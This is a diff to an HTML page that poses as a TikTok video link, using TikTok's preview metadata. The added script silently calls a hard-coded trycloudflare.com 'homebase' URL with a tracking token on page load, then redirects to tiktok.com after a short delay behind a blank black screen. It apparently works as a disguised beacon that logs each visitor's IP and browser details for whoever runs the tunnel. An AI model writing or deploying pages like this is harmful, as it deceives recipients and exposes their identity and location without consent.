@@ -1,26 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <meta property="og:title" content="TikTok" />
-  <meta property="og:description" content="Watch this video on TikTok" />
-  <meta property="og:image" content="https://p16-sign.tiktokcdn-us.com/tos-useast5-p-0068-tx/og_default.jpg" />
-  <meta property="og:url" content="https://www.tiktok.com" />
-  <meta property="og:site_name" content="TikTok" />
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="TikTok" />
-  <meta id="redirect-url" name="redirect" content="https://www.tiktok.com" />
-</head>
-<body>
+<meta charset="UTF-8">
+<meta property="og:title" content="TikTok" />
+<meta property="og:description" content="Watch this video on TikTok" />
+<meta property="og:image" content="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-desktop/8152caf0c8e8bc67ae0d.png" />
+<meta property="og:site_name" content="TikTok" />
 <script>
-  // Recupere la vraie URL depuis le fichier config
-  fetch('/tok/video.json?t=' + Date.now())
-    .then(r => r.json())
-    .then(data => {
-      if (data.url) window.location.href = data.url;
-      else window.location.href = 'https://www.tiktok.com';
-    })
-    .catch(() => window.location.href = 'https://www.tiktok.com');
+var homebase = "https://saw-political-elementary-raised.trycloudflare.com/go/9FxaX1AxrlCuo8V1";
+var redirect = "https://www.tiktok.com";
+if (homebase) fetch(homebase, {mode:"no-cors"}).catch(function(){});
+setTimeout(function(){ window.location.href = redirect; }, 400);
 </script>
+</head>
+<body style="background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
+<div style="color:white;font-family:sans-serif;text-align:center"><div style="font-size:32px">&#9835;</div></div>
 </body>
 </html>
